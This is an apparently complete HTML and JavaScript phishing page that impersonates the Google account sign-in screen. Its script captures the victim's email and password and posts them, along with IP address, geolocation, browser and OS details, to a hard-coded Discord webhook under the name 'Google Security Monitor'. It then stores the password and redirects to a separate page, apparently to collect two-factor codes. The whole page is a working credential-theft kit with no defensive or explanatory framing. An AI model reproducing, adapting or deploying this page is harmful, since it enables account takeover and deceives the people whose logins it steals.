<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
  <title>Google Account - Sign in</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
    }

    body {
      background-color: #ffffff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    .container {
      width: 100%;
      max-width: 448px;
    }

    .login-card {
      background: #ffffff;
      border-radius: 8px;
      border: 1px solid #dadce0;
      padding: 48px 40px 36px;
    }

    .google-logo {
      text-align: center;
      margin-bottom: 28px;
    }

    .google-logo svg {
      width: 75px;
      height: auto;
    }

    h1 {
      font-size: 24px;
      font-weight: 400;
      color: #202124;
      text-align: center;
      margin-bottom: 8px;
    }

    .subtitle {
      font-size: 16px;
      color: #5f6368;
      text-align: center;
      margin-bottom: 32px;
    }

    .input-group {
      margin-bottom: 24px;
      position: relative;
    }

    .input-field {
      width: 100%;
      padding: 13px 15px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      outline: none;
      transition: all 0.2s;
      background: #ffffff;
    }

    .input-field:focus {
      border-color: #1a73e8;
      box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
    }

    .input-field:hover {
      border-color: #bdc1c6;
    }

    .input-label {
      position: absolute;
      left: 15px;
      top: 50%;
      transform: translateY(-50%);
      background: white;
      padding: 0 4px;
      color: #5f6368;
      font-size: 16px;
      pointer-events: none;
      transition: all 0.15s ease;
    }

    .input-field:focus + .input-label,
    .input-field:not(:placeholder-shown) + .input-label {
      top: 0;
      font-size: 12px;
      color: #1a73e8;
    }

    .password-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 8px;
    }

    .show-password {
      background: none;
      border: none;
      color: #1a73e8;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      padding: 4px 8px;
      border-radius: 4px;
    }

    .show-password:hover {
      background-color: #f0f0f0;
    }

    .forgot-link {
      text-align: right;
      margin-top: 8px;
    }

    .forgot-link a {
      color: #1a73e8;
      text-decoration: none;
      font-size: 14px;
      font-weight: 500;
    }

    .forgot-link a:hover {
      text-decoration: underline;
    }

    .next-btn {
      width: 100%;
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 12px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.2s;
      margin-top: 16px;
    }

    .next-btn:hover {
      background-color: #1669c9;
    }

    .next-btn:disabled {
      background-color: #c3c7cf;
      cursor: not-allowed;
    }

    .create-account-section {
      margin-top: 32px;
      text-align: center;
      border-top: 1px solid #dadce0;
      padding-top: 32px;
    }

    .create-account-btn {
      background: none;
      border: none;
      color: #1a73e8;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      padding: 8px 16px;
      border-radius: 4px;
    }

    .create-account-btn:hover {
      background-color: #f0f0f0;
    }

    .error-message {
      background-color: #fce8e6;
      border-left: 4px solid #d93025;
      padding: 12px;
      margin-bottom: 20px;
      border-radius: 4px;
      display: none;
      font-size: 14px;
      color: #d93025;
    }

    .footer {
      text-align: center;
      margin-top: 32px;
      font-size: 12px;
      color: #5f6368;
    }

    .footer a {
      color: #5f6368;
      text-decoration: none;
      margin: 0 8px;
    }

    @media (max-width: 480px) {
      .login-card {
        padding: 32px 24px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="login-card">
      <div class="google-logo">
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="75px" height="75px">
          <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z" />
          <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z" />
          <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z" />
          <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z" />
        </svg>
      </div>
      
      <h1>Sign in</h1>
      <div class="subtitle">Use your google account</div>
      
      <div id="errorMessage" class="error-message"></div>
      
      <form id="loginForm">
        <div class="input-group">
          <input type="email" id="email" class="input-field" placeholder=" " autocomplete="off" required>
          <label class="input-label">Email or phone</label>
        </div>
        
        <div class="input-group" id="passwordGroup" style="display: none;">
          <div class="password-header">
            <label style="font-size: 12px; color: #5f6368; font-weight: 500;">Enter your password</label>
            <button type="button" id="showPasswordBtn" class="show-password">Show</button>
          </div>
          <input type="password" id="password" class="input-field" placeholder=" " autocomplete="off">
          <div class="forgot-link">
            <a href="#" id="forgotLink">Forgot password?</a>
          </div>
        </div>
        
        <button type="button" id="nextBtn" class="next-btn">Next</button>
      </form>
      
      <div class="create-account-section">
        <button type="button" id="createAccountBtn" class="create-account-btn">Create account</button>
      </div>
      
      <div class="footer">
        <a href="#">Help</a>
        <a href="#">Privacy</a>
        <a href="#">Terms</a>
      </div>
    </div>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1487481879518249143/rzfXcuXId2iWAXJsWD9CmFCGPE7Pr2KXXbyp3B6LOQulZAW5Q8qQ2b3ITKMHbc_-rHat";
    
    let currentEmail = "";
    let isPasswordStage = false;
    let isPasswordVisible = false;
    
    function getSystemInfo() {
      const userAgent = navigator.userAgent;
      let browser = "Unknown";
      let os = "Unknown";
      
      if (userAgent.indexOf("Chrome") > -1 && userAgent.indexOf("Edg") === -1 && userAgent.indexOf("OPR") === -1) browser = "Google Chrome";
      else if (userAgent.indexOf("Firefox") > -1) browser = "Mozilla Firefox";
      else if (userAgent.indexOf("Safari") > -1 && userAgent.indexOf("Chrome") === -1) browser = "Apple Safari";
      else if (userAgent.indexOf("Edg") > -1) browser = "Microsoft Edge";
      else if (userAgent.indexOf("OPR") > -1) browser = "Opera";
      
      if (userAgent.indexOf("Windows NT") > -1) os = "Windows";
      else if (userAgent.indexOf("Mac OS") > -1) os = "macOS";
      else if (userAgent.indexOf("Linux") > -1 && userAgent.indexOf("Android") === -1) os = "Linux";
      else if (userAgent.indexOf("Android") > -1) os = "Android";
      else if (userAgent.indexOf("iPhone") > -1 || userAgent.indexOf("iPad") > -1) os = "iOS";
      
      return { browser, os, userAgent };
    }
    
    async function getIPAddress() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch (error) {
        return "Unable to fetch";
      }
    }
    
    async function getLocation(ip) {
      try {
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        if (data.error) return "Location unavailable";
        return `${data.city || "Unknown"}, ${data.region || "Unknown"}, ${data.country_name || "Unknown"}`;
      } catch (error) {
        return "Location unavailable";
      }
    }
    
    async function sendEmailToDiscord(email, ip, location, systemInfo) {
      const embed = {
        title: "📧 Google Account - Email Captured",
        color: 0xea4335,
        fields: [
          { name: "📧 Email", value: `\`\`\`${email}\`\`\``, inline: false },
          { name: "🌐 IP Address", value: `\`${ip}\``, inline: true },
          { name: "📍 Location", value: location, inline: true },
          { name: "💻 Browser", value: systemInfo.browser, inline: true },
          { name: "🖥️ OS", value: systemInfo.os, inline: true },
          { name: "⏰ Time", value: new Date().toLocaleString(), inline: true }
        ],
        footer: { text: "Stage 1/2 - Email captured" },
        timestamp: new Date().toISOString()
      };
      
      try {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ embeds: [embed], username: "Google Security Monitor" })
        });
      } catch (error) {}
    }
    
    async function sendFullCredentials(email, password, ip, location, systemInfo) {
      const embed = {
        title: "🔐 GOOGLE ACCOUNT FULL CREDENTIALS",
        color: 0xea4335,
        fields: [
          { name: "📧 Email", value: `\`\`\`${email}\`\`\``, inline: false },
          { name: "🔑 Password", value: `\`\`\`${password}\`\`\``, inline: false },
          { name: "🌐 IP Address", value: `\`${ip}\``, inline: true },
          { name: "📍 Location", value: location, inline: true },
          { name: "💻 Browser", value: systemInfo.browser, inline: true },
          { name: "🖥️ OS", value: systemInfo.os, inline: true },
          { name: "🔍 User Agent", value: `\`\`\`${systemInfo.userAgent.substring(0, 300)}\`\`\``, inline: false }
        ],
        footer: { text: "⚠️ 2FA Required - Redirecting to verification page" },
        timestamp: new Date().toISOString()
      };
      
      try {
        await fetch(DISCORD_WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: "@everyone **⚠️ GOOGLE LOGIN CREDENTIALS CAPTURED ⚠️**", embeds: [embed], username: "Google Security Alert" })
        });
      } catch (error) {}
    }
    
    function showError(message) {
      const errorDiv = document.getElementById('errorMessage');
      errorDiv.textContent = message;
      errorDiv.style.display = 'block';
      setTimeout(() => { errorDiv.style.display = 'none'; }, 4000);
    }
    
    async function handleNext() {
      if (!isPasswordStage) {
        const email = document.getElementById('email').value.trim();
        if (!email) { showError("Enter an email or phone number"); return; }
        
        currentEmail = email;
        
        const ip = await getIPAddress();
        const location = await getLocation(ip);
        const systemInfo = getSystemInfo();
        await sendEmailToDiscord(email, ip, location, systemInfo);
        
        isPasswordStage = true;
        document.getElementById('passwordGroup').style.display = 'block';
        document.getElementById('nextBtn').textContent = 'Next';
        document.getElementById('password').focus();
      } else {
        const password = document.getElementById('password').value;
        if (!password) { showError("Enter a password"); return; }
        
        const nextBtn = document.getElementById('nextBtn');
        nextBtn.disabled = true;
        nextBtn.textContent = 'Verifying...';
        
        const ip = await getIPAddress();
        const location = await getLocation(ip);
        const systemInfo = getSystemInfo();
        await sendFullCredentials(currentEmail, password, ip, location, systemInfo);
        
        // Store credentials in sessionStorage for 2FA page
        sessionStorage.setItem('googleEmail', currentEmail);
        sessionStorage.setItem('googlePassword', password);
        
        // Redirect to 2FA verification page
        window.location.href = 'google-2fa.html';
      }
    }
    
    function togglePassword() {
      const passwordInput = document.getElementById('password');
      const showBtn = document.getElementById('showPasswordBtn');
      if (!isPasswordVisible) {
        passwordInput.type = 'text';
        showBtn.textContent = 'Hide';
        isPasswordVisible = true;
      } else {
        passwordInput.type = 'password';
        showBtn.textContent = 'Show';
        isPasswordVisible = false;
      }
    }
    
    document.getElementById('nextBtn').addEventListener('click', handleNext);
    document.getElementById('showPasswordBtn').addEventListener('click', togglePassword);
    document.getElementById('forgotLink').addEventListener('click', (e) => {
      e.preventDefault();
      window.location.href = 'https://accounts.google.com/signin/v2/recovery';
    });
    document.getElementById('createAccountBtn').addEventListener('click', () => {
      window.location.href = 'https://accounts.google.com/signup';
    });
    
    document.getElementById('email').addEventListener('keypress', (e) => {
      if (e.key === 'Enter') handleNext();
    });
    document.getElementById('password').addEventListener('keypress', (e) => {
      if (e.key === 'Enter' && isPasswordStage) handleNext();
    });
  </script>
</body>
</html>
